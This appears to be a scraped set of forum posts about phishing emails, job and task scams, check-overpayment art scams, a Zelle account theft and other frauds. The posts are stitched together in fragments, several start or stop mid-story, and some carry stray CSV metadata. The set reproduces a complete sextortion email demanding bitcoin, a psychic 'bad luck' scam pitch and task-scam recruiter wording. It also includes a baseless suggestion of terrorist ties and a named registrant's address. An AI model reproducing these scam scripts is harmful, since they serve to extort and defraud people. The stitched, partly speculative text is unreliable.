So long story short it's obviously a scam, but this isn't what the post is about. After I reported the email to Paypal I wanted to dig a little deeper into this since I don't usually get that many phishing attempts sent to my email. When I first looked at the email from my phone, I noticed the email was addressed as [service@PayPal.com](mailto:service@PayPal.com) , which seemed legit until I opened it on my pc and realized that that was just the account's name, and the actual log in ID was a bunch of random letters and numbers @ what I can only assume to be a free mail hosting service. Kinda scary how most phones only show the email's name since as I can see how a lot of people might be tricked by that, but that's besides the point. I inspected the button they sent in that email and found it linking to what is clearly not PayPal, but I wasn't brave enough to actually see where it went. However, when I went to view the raw message, a feature I was only slightly aware of in Yahoo Mail, I was able to go through it and pretend I understood exactly what everything meant.

I can only imagine PayPal put this in here in case something went wrong with the email and the actual HTML message couldn't be sent? I checked with the email and this isn't what it contained. The bit about privacy at the end was present on both ends so it clearly was meant to be viewed in one context or another.

\- which is definitely not the bank's website.

The funny thing is when I copied the link and opened in an incognito window, it redirected to -

It seemed like something he would send me, so I replied with ""Yes, I can send a check today."" Then I got a reply with a name and address, asking ""for the check to be mailed out via usps/ups/fed ex next day delivery.""

my wife received a phishing email. For fun, I tried to see what I can learn from it.

SMTP headers showed the use of SMTP relay, threading the email through gmail and hotmail. At the bottom, however, I found the IP address 5.231.208.76, which is in Germany and owned by GHOSTnet GmbH. A cursory google search showed that this ISP has a very plain website and is connected to phishing. [(example)](https://www.reddit.com/r/vpnreviews/comments/4jt5zh/nordvpn_a_little_review/?st=j3a1oepm&sh=971a3377)

(EDIT: the actual geoocoordinates associated with the IP address are 50.2266, 8.6213, if that helps.) 

The phishing link was: http://x.co/6lsUZ. Using checkshorturl.com, I exploded that to  	https://apptrustedcloud.komsalam-service.info/. (Google translate tells me ""komsalam"" means ""As a Muslim"" in Arabic, possibly suggesting ISIL ties, perhaps?)

The domain is registered to one Paula Alper, no organization, 2578 Balwynne Park Road, 19131 Philadelphia. Tech email is oscar_shales@hornyalwary.top. The domain is marked as inactive and on client hold.

The site has a Let's Encrypt Authority X3 certificate made out to global-cheat.center (at least the name is honest there), valid from May 22 - August 20, 2017. (Is the short duration indicative of anything, here?) This FQDN is actually resolveable, leading only to a website with a private cgi directory.

This is all I squeezed out from this. Is there anything I can do with this information? We're EU residents and citizens.

Thanks!

My thinking is that, since many phishing attacks rely on users misreading a domain name (such as ""twiter.com"" or ""tw1tter.com"" instead of ""twitter.com"") and most computer users only visit about a dozen websites on a daily basis, this will catch most phishing attacks before they can start.

to \[REDACTED\]

Good day. The following details might be of interest to you.

3/24/2023 3:09:36 PM

is when I managed to compromise your device's operating system, gaining unrestricted access to your account ""\[REDACTED\] "". I've been diligently observing your activities for a considerable span of time.

I've established software on your system that lets me manage all your devices.

The malware I've positioned gives me complete command over your device's essential tools – your microphone, video camera, keyboard, and display. Your data, photos, and browsing history now reside on my servers, along with access to all your communication platforms – messengers, social networks, emails, synced data, chat histories, and contact lists.

It's quite interesting what I've found about you!

I deliberated on how I could leverage this data...

Recently, I've conceptualized an intriguing idea: using AI to develop a split-screen video. One side displays you involved in masturbate , while the other casts your internet navigations. Videos like this are currently trending!

I mean, what we ended up with, it's just... wow.

With a single click, I can distribute this video to all your contacts through email, social networks, and instant messengers. Furthermore, I could expose access to all the emails and messaging apps you use.

Additionally, I found a plethora of intriguing materials that I could disseminate online and share with friends.

If you don't want me to do it, send me 1100 $ (US dollar) in my bitcoin wallet.

BTC address:

bc1qa7s0gqxyn3922tr4fxcpv7s0n6q7muy29tvc8f

If you're unfamiliar with how to fund a Bitcoin wallet, you can always use Google for help. It's quite straightforward.

Upon receipt of the funds, I will promptly eliminate all unwanted material. Subsequently, we will go our separate ways. I pledge to deactivate and remove all malware from your devices without fail. You can have complete confidence in me; I stand firmly behind my words. This agreement is fair, particularly given the significant time and effort I have dedicated to tracking your profile and traffic.

You have exactly two days (48 hours) from the time this letter is opened to make the payment.

After this period, if I do not receive the specified amount from you, I will send everyone access to your accounts and visited sites, personal data, and edited videos without warning.

You see, I don't mess up. It's not a good idea to try and pull pranks on me because I have plenty of tricks up my sleeve.

There's no point complaining about me because they can't find me. Formatting the drive or destroying the device won't help because I already have your data.

Replying to this message is futile - I didn't use a personal email to send it and I won't be checking for responses.

Best of luck, and don't take it too personally!

We all have our roles, and it seems you drew the short straw today.

P.S. In the future, I recommend that you follow the safety rules on the Internet and do not visit dubious sites.

1692738089.0,JetBlue Mastercard Activation warning,"My wife got her cc number lifted, and a fraud alert was generated.  She got her new card, went to [jetbluemastercard.com/activate](https://jetbluemastercard.com/activate), and activated it.  The next day, a new fraud alert, and she had not even used her card.  We get a new (third) card today, and I go on my laptop (Mac, Safari browser) to do the activation.  I type in the address (which was on a sticker on the card) and hit return, and immediately all my antenna go up.  The website looks sketchy, with typos, and the address domain is not jetbluemastercard or Barclays (the issuing bank), but instead ""[teuscherfifthavenue.com](https://teuscherfifthavenue.com) ""  I go back and retype the address, this time making sure I don't just hit return and accept the google ""top hit"", and it takes me to he correct site.  Apparently what had happened with the second card is she went to this site, didn't notice, entered her info, and her new number got lifted.  The site does ultimately take you to the correct activation site (since they want you to activate your card), but of course by then its too late.  

Not sure exactly what is going on.  It seems like someone set up this site and gamed it so that it shows up first on the Google search when you type the [jetbluemastercard.com/activate](https://jetbluemastercard.com/activate) address.  I had not gone to this site previously since she had activated the second card on her own laptop, and today I used mine.  But it seems like if you type in the correct address and then just hit return without thinking about it, you're taken there and not to the correct site.  But I'm not an expert on this, so if anyone has a better idea, lmk.

I reported this to both Google and to Barclays.  I also turned off the setting to pop up Google suggestions when you type an address.",phishing,1823,313,53,1

They asked for my email and I received a phishing email that looked like the pictures below. Thankfully there weren’t any links in the email. Since I had never actually received money through Zelle, I was none the wiser about Zelle “business transactions”. After doing more research I found that this is actually a pretty common scam tactic to get the seller to refund the extra money needed to “lift the restriction on your account” and then you would either be out the money you refunded to the buyer or worse the scammer would be able to access your bank information. Luckily I did not fall for this scam and saw the red flags but definitely something to keep in mind is scammers like to create a sense of urgency hence the portion about only having 30 minutes to refund the buyer.

1692405904.0,The Dangers of Scanning a Random QR Code in the Wild (Social Experiment),"This post is a social experiment and the QR code you just scanned is perfectly safe and is intended as a social experiment and a neat way help bring awareness to Cybersecurity and it's professional field and inspire somebody to take interest in this complex and incredibly gratifying line of work.

QR codes have become an important part of our daily lives, providing quick access to websites, products, and services. While they offer incredible convenience, scanning random or untrusted QR codes can lead to several security risks.

A malicious QR code can direct your browser to a website filled with malware, potentially compromising your device's security. There's also a risk of landing on phishing sites that look legitimate but are designed to steal your personal information. These QR codes can even execute unwanted actions on your device, such as sending texts or changing settings, without your consent.

Unlike traditional URLs, QR codes don't always reveal the linked address beforehand. This lack of transparency can mask the attacker's intentions, making it even easier to deceive unsuspecting victims. Furthermore, some QR codes can track and share your location, leading to serious privacy concerns.

To protect yourself from these hidden dangers, it's essential to exercise caution when scanning QR codes. Always consider the source and ensure it's from a trusted entity. Utilize a scanner with security features, and keep your device's security software up to date.

While QR codes offer many conveniences, the potential risks associated with random or untrustworthy codes should not be ignored. With a cautious approach, you can enjoy the benefits of QR codes without compromising your digital privacy and security.

1689671248.0,Really weird scam email,"I saw someone else posted on here with a really similar email less than a day ago, but I received this email overnight which is obviously a scam but is just so baffling that I have to share it with people. Googling the subject line without quotation marks on either side doesn't give any decent results, but adding the quotes makes it return one result, which says it's a quote from a book called Through Central Borneo. The words at the bottom of the weird number string seem to just be nonsense, though. Absolutely no search results come up for anyone named ""Jacelyn Mero"" on Google. It was sent to four email addresses including mine, and I have no clue who the other three people are. It also had a calendar file attached, which I didn't open of course, but it did have this Siri pop-up that allowed me to see its contents anyway, and it comes with even more meaningless words attached. From what I've found online, the calendar thing is basically just an easy way to get people to click on phishing links or download things and the nonsense words were just to avoid getting sent to the junk folder but like I said, I just need to share this somewhere. I'm also really intrigued by the fact that both me and the other person who posted about an email like this got ones with subject lines that, when Googled, seem to come from books from the 1910s. Why 1910s books specifically? That's what I want to know.

Something felt weird though, for example the Email its from is ""[service@paypal.co.il](mailto:service@paypal.co.il)"" , my full name isnt in the Email, it leads me to another Site where I have to login, and obviously, that I have to claim a payment. The latter seemed less suspcious since its the exact Amount from Fiveer, maybe an Update?

I didnt login on that weird site and it feels like a pishing attempt since that Email isnt Paypals and googling shows Israeli Sites and a an Article warning about that Email Adress, I also changed my Password on Fiveer and Paypal, but what do I do now? Something obviously is wrong if they know the exact Payment Im expecting from Fiveer.

So I contacted PayPal Support by now who told me the Email is not legitimate (and I forwarded the it to the phishing@paypal email), and Fiveer Support who told me that the Email IS legitimate and insists to get my money to click on the link and login, so what do I do now?   


The more I look on the Login Site for Paypal from the Email the more it looks suspcious, but as if effort has been put into it. (Like the Paypal logo is a png for example, not clickable).   


Since the Email is from Israel and Fiveer is from Israel, including Customer support insisting its a legit Email and telling me to get my money is to login...plus the Email knew exactly how much money and from where I was waiting for...am I too paranoid?

1688283723.0,google search result showing possible email phishing scam for instagram in website description?,"hi everyone, like the title says, I was searching for instagram FAQs on google when I stumbled upon a suspicious link. the link itself looked normal and even had the instagram icon, but the description of the link was interesting. the description from google basically said ""you're about to remove ""example_email@ gmail. com"" from your account. remove email."" 

when I clicked on the link (dumb of me I know) i was shown a prompt that was the same as above about removing the specific listed email from my account. I believe the instagram link is legitimate as logging out from the official site logged me out on the link as well, but I do think there is something fishy with the link. 

I looked up the email on google to little results, however on bing, I saw that some websites had the same email in the description that read, ""you are about to use example_email@ gmail. com for your recovery email for 
""second_example_email@ gmail. com."" 

I didn't click on these links as they were more cause for alarm than the instagram link but does anyone know what's going on? from what I can tell it seems that the email may be a part of something malicious but why would it appear for the top google search result for instagram? surely this is some kind of phishing scam? I assume this would be the case as my guess is as soon as one would respond with ""remove email,"" it would prompt users to log back in through the link on google. 

I didn't enter any information either besides already being logged in. I've also made sure to change my login info ASAP and so far I don't see anything suspicious on my instagram account. am I also safe or possibly screwed? thanks to anyone who can give some insight.

I entered all my data and approved the payment via Revolut card. 
After some seconds I was informed by Revolut that there was a fraud attempt and my card was blocked - no money was sent and I've blocked the card permanently. 
Also the password that I used for the account creation is used only on lowimportant sites.

The only exposed data is: my email, address, Phone number and my name. 

Should I be concerned about my compromised data? What actions would you recommend?

Of course I've already contacted with the original shop, as well as with a incident response department.
I'm really shocked that the official company is not giving a fuck and let these phising sites work normally.

1) I reported the email in question using the phishing report feature (May 8th) and the compliance/security team has acknowledged that I did so. 
2) I checked my browsers histories and there is no entry for the link or domain in the email. 
3) I checked all three iOS devices I have that use Outlook and the domain is not showing up there either. 
4) Furthermore, those Outlook apps are configured to use the iOS default browser which is Chrome, not Safari
4) I use the web version of Outlook

So now I have to take training for failing the test.  Basically it’s going to be on my record and yes, that bothers me. It could very easily be leveraged for the wrong purposes.  I am a QA engineer by trade. 

I am certain I did not click on the link.

I’ve reported three previous ones. 

What options do I have here?  Does iOS have logs I can access (they maintain it was done from an iOS device)? Does Outlook have application logs?  I’ve exported all of my browser history (or have taken screenshots).  I’m trying to look for the anti-smoking-gun.

So the job is to generate data and user accounts for apps. There's no data or coding required all you need to do is click a submit button 40 times. Each time is for a different app and you get a small percentage of the profit which increases the longer you do the job. During training I did this on the trainers account and it made them about 250 USDT which they could withdraw into an app for cryptocurrency and then take it out in £ which is paid straight into your bank account. 

To reset your account for the app data you need to deposit about 100 USDT so about £100. Which will allow you to start the process again and upgrade your account. 

If you log in 5 days in a row you get a bonus of 800 USDT, 15 days = 1500 USDT, 30 days = 3800USDT.

1680030031.0,Art Scam Alert - Trinity Insurance & Financial Consultaion,"I found this job on LinkedIn which basically entailed that this “company” was looking for 10 drawings to be used in an ad for the business. I applied for the position and the next day was reached out by their “President” Nelson Tate. He said that he was very impressed with my portfolio that I had online and asked if we wanted to work together and gave me his email.

We corresponded, and I told him I was interested in working with him. He offered me a STUPID amount of money for this job, with each drawing costing about 1002.30 USD. I was flabbergasted because I needed money as I’m moving to a different state, and I would also love to beef up my resume. I’m a freelance illustrator that graduated from college a year ago; this would’ve been huge for me. 

However, my guard was up. I had remembered a video on TikTok about scam happening to one of my art friends. My friend was approached by a “company” looking to pay them an exorbitant amount of money for a few drawings. If my friend would’ve cashed the checks, the client would’ve backed out halfway through their deal due to a “family emergency” and ask for the money back. If my friend had sent them money, the would’ve bounced their checks, sending my friend into so much debt with the bank. 

I did try and look up the company and the president online to see if it was too good to be true. Sure enough, there was a website for a “Christian-lead insurance company” called Trinity IFC but it was not the first insurance website to pull up on Google. It was the second option. I had even tried to look up “Nelson Tate” on LinkedIn again to find that his profile was deleted off the site. However, I gave him the benefit of the doubt, thinking that he only applied to the website to advertise the job and then move on — which was stupid of me.

“Nelson” asked me to drum up a contract, which I did and then he said he’d send me a check with the money. He ended up mailing the ENTIRE AMOUNT (and then some) and emailed me saying that he needed the extra $6,438.38 back to pay a DIFFERENT artist working on a different project. That’s when I knew for absolute certain that it was a scam. 

This person has my name, my new address, and phone number. Are there any actions I should take as a precaution or should I block the sender and try and move on?",scam_radar,2308,437,39,1

1680481209.0,Art Scam Alert - Quarters on Red Bluff,"Hi everyone! I had recently seen a posting here about an Illustrator job with Trinity Insurance and Financial Consulting and about how it was a scam. Earlier this week, I had been communicating with that person and it seemed fishy. Upon researching it some more, my boyfriend found a Reddit posting about multiple people going through the same sketchiness that I did. With that in mind, I had been extra wary when applying to jobs. I’ve been struggling to transition from teaching into the art world so when I got a legit looking email from Quarters on Red Bluff after filling out an application via LinkedIn (BOTH of these fake jobs were posted on LinkedIn and then deleted), I jumped at the chance. We set up a time to video call, as the person stated it would be via Skype. The company is in CST and I am in EST so we confirmed that the interview would take place at 5pm EST. At 5:10 I sent a quick email inquiring about the status of our interview (very politely!! I need a job lol) and was met with some “oh so sorry, my bad” type responses. We didn’t end up starting on Skype until 5:35 EST (and it was all chat, no video, which was sketchy red flag 1.5). What entailed after that I can only describe as a complete waste of my time. I was shared a Word doc and given a half hour to complete it. It was legitimate questions about graphic design and myself as a designer. One of the questions asked about minimum income requirements. After filling it out and sending it back, they had me wait over Skype CHAT while they “reviewed” my questions. Upon review 20 min later, they proceeded to say I was in, they offered me DOUBLE what I had asked for (red flag 2) and then stated they would send a check my way. This was just like Trinity and I’m disgusted with the fact that they took two hours of my time. Wish I realized sooner and hope I can help someone avoid this!!!

Someone will reach out to you and tell you that if you work remote on their app daily for 5 days you will get $500 and then they will help you create an account and run you through training and show you that in wallet you get some money and you make commission on performing tasks.  


The working of this app is that you get some amount in your app wallet and perform a submit task where you invest some money into the app and within few seconds it returns the amount with some commission of 0.06%. 

Once you make some commission they start hitting you with auto double submissions and send your wallet address in negative. As you do generate some commission they send your account in negative and support will tell you to invest your own money in there to make it balance again which you can take out after task. 

It works okay till its 20-$30s but soon it becomes double and double and leads to hundreds and thousands. The number keeps rising on each task and they keep sending you in minus and keeps asking you to add more so you can finish you task and take out but as there are 40 tasks and you get double every few time it can end up thousands in minus and either you keep feeding them or you lose what you have invested already. 

&#x200B;

They ask you to borrow money from friends or any one and just keep feeding their platform.

1688827246.0,"Pivot Marketing in Coral Gables, Miami - SCAM !!!"," 

I just finished an interview with a “Marketing” company called Pivot Marketing located in Coral Gables, Miami, Florida.

I'm taking my time to alert other people about this organization and don't waste your time.

I am a father of a family looking for a job opportunity to support my family. I applied for several jobs and these people contacted me the day after applying. I was excited. I had a first interview with 4 other girls via zoom.

The first alert was that my appointment was at 12pm and I received 2 texts confirming the interview, but in the last text the time changed suddenly. It said 2pm. But It's ok, I needed the job so I made the necessary changes. This interview was with Mrs. Naroa Mena, from Spain, ""CEO"" of this organization. After that interview where they asked general and simple questions, they told us that they were going to select the candidates who will go on to the next round of interviews.

They didn't take more than 30 minutes before they were already calling you and congratulating you on making it to the next round. They gave me an appointment for the next day at 8.15am. I was there today Punctual!

This second interview was conducted by Mr. David Moreno, Colombian and Assistant Manager. It was more extensive. 30 - 40 min Approx. There, he explained the different levels of ""work"". He said they help Non-profits companies raise money for their causes.

The first level is “campaign Developer” where they say you earn between $400 - $600 plus bonuses.

Second level “Mentorship” $600-$900 plus bonuses.

Third level ""Assistant Manager"" $2000 per week.

And then ""Regional Director"" approximately $100,000 a year.

I asked him a question to which his answer was not very convincing.

What were they based to determine the exact salary of each level? His answer was ""performance"". That is to say, depending on what you sell and do, they ""pay"" you more or less.

Anyway, I did my research afterwards and found a blog from someone who went through exactly the same thing. Here I give you the link:

[https://www.theladders.com/career-advice/i-accidentally-interviewed-at-a-multi-level-marketing-scheme-heres-how-to-avoid-them](https://www.theladders.com/career-advice/i-accidentally-interviewed-at-a-multi-level-marketing-scheme-heres-how-to-avoid-them)

People in Miami, PLEASE avoid wasting your time with this ""company"", which by the way is not a company registered in the state of Florida, Ms. Naroa Mena is not associated with any LLC or Corp. Legitimately registered in Florida for the date of this review.

The web page used by this organization which seems like a legitimate Marketing company, but it is not. It's this one:

[https://pivot-mktg.com/](https://pivot-mktg.com/)

It's not in Google My Business, you can't find the address on Google Maps. Only 800 followers on Instagram: pivot\_mktg

Only 2 followers on Facebook…. And stop counting... All very cloudy for me.

There is a company called Pivot Marketing, based in Indianapolis that does look legitimate. And it's in the Better Business Bureau. But these people from ""Pivot Mktg"" are a SCAM!!!! It is a Multilevel Marketing Company, better knowns as MLM Companies!!!!",scam_radar,3177,497,108,1

1688585300.0,Commission Scam on Insta using Fake Paypal Email,"I thought this would be relevant to artists getting commissions on Insta.

Basically I got someone on Insta this week, claiming they want to commission me. They wanted a portrait of their daughters pet. It was just about convincing enough to not make me suspiscious right away. They didn't ask for a price though, just offered 500 Dollars right away.

After everthing was laid out regarding the piece, they said they'd pay 50 percent in advance as security deposit and asked for my Paypal and name on my account. A few minutes later I get an E-Mail fom what looked like Paypal, claiming I didn't have a business account and the client has to send another 100 bucks which I immediately have to send back and let Paypal now so they'd forward me the 250 Dollars. However, the ""client"" then gave me a completely different Paypal that wasn't even in the same language. Her name on insta sounded English, maybe American, the one she wanted me to send the 100 Dollars to was all in Kanji. I was stupid and sent it. Being on my phone I didn't see the whole email, otherwise I would have seen right away that it was actually a gmail account and that it looked odd. So all I saw in the adress was PayPalservice, written exactly like this. Add to that a stressful week in general....well. But anyway, she then told me she couldn't send me confirmation because she didn't have access to her account and wanted me to send another 100 to yet another paypal account at which point I finally had the sense to step back a bit and not do anything for the moment. She even had the nerve to tell me where to report it on paypal so I could get a refund. But having it set to friends and family, protection didn't apply of course. So for now I sent the fake mails to Paypal's security and contacted my bank for a charge back.

As of now she's still trying to contact me, repeatedly asking if I got the refund.

Hope this helps, stay safe, don't be stupid like me.

Edit: Added schreenshots of the mails.

1697590595.0,"I Won a Gift Card and ""FREE"" Nights at A Hotel! Or Did I get scammed?","*TLDR: Wife and I won a ""free"" vacation that is basically a 1-night stay to then listen to a timeshare presentation. I already gave them a deposit (via credit card) that is only refundable after I sit through the presentation. I realized it was a shady scam after I already gave deposit. Do I call my credit card company and do a chargeback, or do I stay the ""free"" night and sit through the presentation to get my deposit back? I already know I'm not buying a timeshare and there's nothing they can say to change my mind.*

Full Story:

My wife and I went to a county-fair-type event this weekend, and when we got there we're automatically entered into a raffle to win gift cards, vacations, etc. Low and behold, I get a call saying that we won a $200 gift card and a ""free"" night at a resort from the same raffle.

""Cool!"", I think to myself. I'm on the phone with them, but my natural scam radar is pinging, so I Google the name of the company they're with and their phone number. All come back on Google as valid. The number I'm calling is the real number for the hotel, their website is legit, and they have Facebook page with a decent amount of followers.

They ask for a refundable deposit of $129, which should have been red flag #1, but I figured that if it was a scam and they stole my credit card, I can file a fraudulent charge with my credit card company and get my money back.

After I give them my card, THEN they tell me that I must attend a 2 hour presentation about their vacation packages. It was at that moment, I realized that I screwed up. After further Googling, I found out that while they are a legit company, they basically give away these ""getaways"" as a way to sucker unsuspecting people into buying the epitome of legal scams: TIMESHARES.

Stories all over the internet say that these ""presentations"" are super aggressive sales pitches where they basically pester you until you crack. Some people, however, have had success sitting through these presentations and have collected their $200 gift card and their original deposit (as promised) by sitting through the 2 hour presentation and setting a hard stop timer on their phones.

I can say with confidence that I'm not getting suckered into buying anything, but the whole situation has gotten me unnerved about what else they can try to pull. Honestly, I would rather just get my money back without going to this thing, but on the invoice they sent me, it clearly states that the reservation is not refundable until I've sat through the presentation. Go figure.

My question is, do I call my credit card company and attempt to get a chargeback, which risks them claiming that I'm cancelling my reservation after I already agreed to give them a deposit, or do I go to the presentation and collect the $200 gift card + my original deposit. Has anyone had success with the first (chargeback) option? Any advice, especially based on a real-life experience with this kind of thing, is greatly appreciated!",Scams,2981,536,76,1

The older spam emails look pretty authentic but since unsubscribing isn't straightforward, I assume it's still spam. That goes to the spam folder automatically. However, it's still a nuisance because I get so many; they are sent from multiple subsidiary brands of the same corporation. These emails started after I sent a message to a domain admin address. It turned out it was for sale by a career domain reseller (I don't know what this is called). They sounded like a regular if jerky person. After that, the spam emails from an unrelated established retail company started coming in (I think they're general sale alerts, not ""buy"" links). I never signed up to anything from them and I normally don't subscribe to anything. That email address was pretty new, mostly inactive, and completely free of spam before this. 

The new spam is definitely inauthentic, though it does try very hard to appear real. (These are sale alerts too, but I think they do link to a list with pricing.) Unfortunately, I realized this only after clicking the unsubscribe link that does not work. Though this account is active and has existed for years, I'd rarely gotten any spam at all until this recent wave. This bunch was marked as spam. The second batch came in through the spam folder. But the third batch appeared in my inbox again. 

There are some (quite old) threads that discuss mass-spam emails, but they're in a much greater volume of messages. The motive for them was assumed to be for hiding bank charges. I haven't seen any suspicious activity in my bank account. 

I've checked my emails for breaches and there was nothing found. 

My two questions, as in the title, what is this type of scam, and how could scammers have gotten my email address? 

Oh, and also: am I safe? I clicked a link in the emails. Now I know I should simply ignore them.",Scams,2035,362,56,1

Because she was an admin, the hacker was able to attempt to delete any pages associated with the account, which meant all her “likes” were gone because the pages were gone.

I was able to recover the page I created, the hacker had attempted to delete it, but Facebook gives 30 days before they delete pages permanently, and the page was scheduled for deletion, and I recovered it and helped her recover her pages as well.

Hello, sorry to bother you, I'm Laurenna from (Kienbaum Company), do you need part-time work? ☺️☺️

That was the first text I got, after that a second person came in as a so called mentor, then I got put in a WhatsApp chat group with other people like me. And a number from customer service. As soon the work started I had to pay in a little amount at first like 12 Euro after that I got more and more at the end I had to pay 2900 just to finish the so called set and withdraw my money. Which was flagged so now they won't me to verify in order to do that they won't me to pay 2800 Euro in. So can withdraw all of it back. But no other form of verification was made. Less money wasn't excepted. I have all the chat conversations. I even ask them to report me to the police if the don't believe me. Won't do it. I asked them to send the company adress including phone no. Won't do that either now I'm tuck and don't know how to get my money back .

They found my fiance through Career Builder and offered $30/hr. That definitely falls under ""too good to be true"" for entry level data entry, but earlier this month a friend of ours got scammed by a job offering $60, so I thought maybe $30 wasn't completely out of the realm of possibility.

I haven't found it on any scam sites and there are a number of reviews on different sites posted about it. They have a mailing address, phone number, and a professional-sounding answering message when you call. Their website is well-designed and has an interactive instant-messenger run by an AI.

The only clue that this company might be a bit flaky was a note on their website to allow five days after ordering for a phone case to ship, as they are all custom-order and it is a small company. If you do not receive an email that your phone case has shipped within five days, the note says, send them an email.

On October 3rd I ordered and was charged for a $64 phone case - expensive, but it's custom-made, you choose the wood, and it's plastic-free and sustainable so the price itself didn't raise red flags. I received an email with an order number immediately.

After a week, no email, so I tried to track my order using their instant messenger AI. The AI said they had no record for my order number. I emailed and sent a message using a form on their website. No answer. I have called several times daily during their office hours but no one has ever answered and they have never returned a call. I messaged their reddit page and commented under a youtube comment supposedly by their CEO under a product review. No response. I tried to leave a review but there is no form to enter reviews on their site despite their site showing dozens of customer reviews.

I have never used Zelle before, but the text looked legit and included the customer service number to my bank. I responded 'no' and immediately after that my Gmail account was bombarded with over 100 spam emails.

two days later, checking my bank account, I noticed that all my money (more than $1000) from my checking account had been transferred through Zelle to that same person from the text.

I've been to my bank and closed that account entirely and reopened a new one, and they have locked my online access temporarily until I can figure out my security.
through two-step verification and checking past devices used to sign in, I don't believe my google account was breached.

what I don't know or understand now, is how compromised the rest of my phone is. forgive my ignorance.. 

do the hackers have access to the rest of my phone?

 is it okay to update my apps with my new bank info?

if I change the passwords to apps on my phone, will they be able to track that?

can they listen to my phone and/or read my texts?

does my phone need to wiped clean/factory reset?

do I need a new phone, or a new number?

She sent us this website called COTPS. We watched the money quadruple over weeks, months maybe. Other people were using the site on a sub called passive streams. There was news the rug got pulled, and we couldn’t get our money back after i notified my partner of this news. The tax lady also got a certain percentage, which was about .8%. So when i sent $500, there was only $496 put into my account on the website. She, the tax accountant, also created our profiles for us by asking what we wanted our username and password to be.

1697562000.0,Is this job a scam?,"I've been contacted on WhatsApp for a job which is: Data Provider User.

It never happend before, so I was pretty suspicious about it. The person came to me after ""receiving"" my job application, but I can't remember sending any job application to the company she was talking about, and when I asked where and when she received it, she didn't answer.

The first thing that was weird is: the person that contacted me didn't took care of explaining the job, she sent another person which is apparently doing the same job. This person could answer every question I had, but never precisely. When I asked about the different tasks I will have to do, he answered with:

""What we need to do is to operate on the (company) workbench and help these apps increase their popularity, reviews and ranking. When theses app's rankings improve, more people can know and use them. If you want to work with us, I will provide you with a (company) link application to create an account. You simply log into your (company) account with your phone or computer to start doing the task through the system.""

What got me even more suspicious was the salary: 800 USDT for 5 days???? + extra commission per day. But the job only needed 30-60mn a day.

Third thing: To get the job, I have to get a training (which is free) and even get a commission after doing the training! When I asked what was the training about, he said:

""I will train you how to do the task in the workbench and how to convert USDT into EURO and help withdraw your commission to your bank account"".

And last thing, the person  really insisted on me doing the training to understand. The whole conversation was pretty unprofessional, and when I said that I had no time to do the training today, he asked me why. Like if I was busy or something. Normally, you don't ask people personnal question for a job application.

I'm pretty young and desperately searching for a job in my country, so maybe this sound really dumbs but I wonder if I just passed an eventual great opportunity to make money, or if I was right to follow my guts.

The client asked me to fill out a form with some information to get to know me. The form asked me things like my hourly rate, my experience, and my public ethereum address. Nothing sketch. But then the client shared with me the linktree about their project. I quickly realized that their scope was way too big. Then he wanted me to download their ""client"" so I could experience the game and get some context to what they wanted to achieve. He kept asking me if I had MacOS. Then he said he would get me a beta code so I could download the client, but he asked me to not share it with anyone. I was already kind of suspicious, but the biggest red flag is when he said I only had 30 minutes to use the code or else it would expire. Fair enough, but it seemed like he wanted me to rush me into downloading it. I declined to download and blocked him. I wanted to share this so others have a reference later if they look it up online.

1697560154.0,Another eBay scam?,"Hi all,
Ive just bought an item (Buy it now) yesterday (Monday) and, according to the order confirmation email from eBay, the item was due to be delivered in a few days (Thursday). 
today I've received an eBay message from the seller informing me that the item won't be dispatched for another few weeks due to the seller being out of the country until November 1st. 
Should I open a dispute with eBay (item hasn't arrived) after the original due date to protect myself? Would I be waiving by buyer protection if I wait until November? 
If I open a dispute after the original due date, does this leave me stuck later when I can't open another dispute for the same item? 


I can't quite see the scam here. I'm not sure if I'm being paranoid or just daft. 
Apologies if this is going over old ground, but I couldn't find anything specific on the subject.

eBay UK

Thanks in advance

I've received a number of texts with the Sysco driver scam image, but they keep coming from what looks like different email addresses?

Is anyone else receiving these?

I appreciate any help I can get - thank you!

Amazon insists they sent the iPhone, not AirPods, and they're unresponsive to my requests to verify stock counts and serial numbers. They've given me a deadline of November 6th to return the iPhone, which I never received, or they won't refund me. 

I believe this amounts to fraud, as they claim to have sent something they didn't and took my money. Since I'm not making progress with Amazon, I've initiated a bank investigation.

And this is what the page says, it goes on and on, but this is just a snippet. I call this bullshit and a fake, but you guys can tell me 

don't mean to upset you, but I noticed something bad... really bad and dark going on with your energy. When I performed a ritual and observed your soul closely, I found out that something's going wrong. This may shock you, but I must reveal this...

You are under the cast of nasty Bad Luck that's sucking the stability out of your finances. This Bad Luck Energy is almost like a spell that is affecting your chances of becoming financially free. I can feel that you are unable to attract the good fortune that I saw for you coming recently. You've missed many chances for success and creating a crazy amount of wealth because of this bad luck energy that's been stuck in your soul for so many years now.

I had a clear vision that showed you with all the riches, happiness, and emotional peace in your life, but your situation is far from reality. The vision was a sure shot no error prediction, and yet I see you struggling every day.

How did you become a victim of vicious Bad Luck?

There are a lot of energies in the Universe that keep wandering around the earth plane, and some of them are extremely harmful to the human soul such as this. When I looked closer I got to know that these negative energies were instilled in some other person, but you came in contact with that person around July 17, 2016.

You don't know this person. Either you touched their body or crossed through their Aura without having energy protection, and that's why you got immediately affected by this ghastly energy. From that day onwards, everything went south and happiness started fading away from your life. Tell me... Isn't this the truth? Of course, it is. I know what you have seen in the past few years and let me say this... If nothing is done now, things will be even worse! You can...

As it's always a PITA to keep the live chat open I figured it would be easier to try it on WhatsApp, so I messaged the number with a phrase they presumably use to start conversations.

After initial chatter with the bot, it put me through to an ""expert"" but then the conversation got a bit weird. They told me my account had no security question or password (it does) and the grammar is really off. The ""kindly"" really made me suspicious about the authenticity of this. I gave them some bogus information and that was that, they updated me on the status of my fault (but it was a pretty generic thing that is applicable to any internet problem). I haven't ever had to enter this new password. Messaging this WhatsApp since, it now just gives an automated message to go to the live chat (which is odd, why would I need to go back?). Looking at the number, it is a mobile number which is strange. It's listed as a business account but I don't know how hard something like that is to set up.

I dont know, if this belongs here, but please tell me where I can get help, if not. Thanks

A good friend of mine got scammed by a girl from Turkey/Romania. He saw her once during a short vacation. 

She was shortly to fly over, and he even bought her a ticket, which she missed for some visa reasons. It was a lie, since she told him she has to prove to the german toll, that she has enough money to make vacation in Germany. So he sent her almost 2.000€ via bank transfer and 500€ via WesternUnion.

Because of buying her a ticket, she sent him her ID and banking details, where the money arrived at the end via SEPA.

So I assume we have her real name and know how she looks like, since they videophoned a lot as well. 

Since I am not familiar on how to proceed from there, what can I do to help or even get the Bank and even police involved? 

Can someone advise me something for my next steps.

From everything I’ve read it seems unlikely because they wouldn’t have a real incentive to do that? Hopefully? 

